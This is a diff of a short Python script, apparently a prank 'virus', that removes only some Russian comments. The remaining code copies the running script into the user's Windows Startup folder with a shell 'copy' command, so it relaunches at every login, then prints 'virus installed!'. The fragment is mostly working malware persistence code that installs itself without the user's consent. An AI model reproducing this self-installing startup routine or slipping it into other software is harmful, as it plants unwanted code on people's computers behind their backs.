@@ -9,9 +9,9 @@ import win10toast
 import pyglet
 import pyautogui
 
-Thisfile = sys.argv[0] # Полный путь к файлу, включая название и расширение
-Thisfile_name = os.path.basename(Thisfile) # Название файла без пути
-user_path = os.path.expanduser('~') # Путь к папке пользователя
+Thisfile = sys.argv[0] 
+Thisfile_name = os.path.basename(Thisfile)
+user_path = os.path.expanduser('~') 
 if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
          os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')
          print(f'{Thisfile_name} virus installed!')
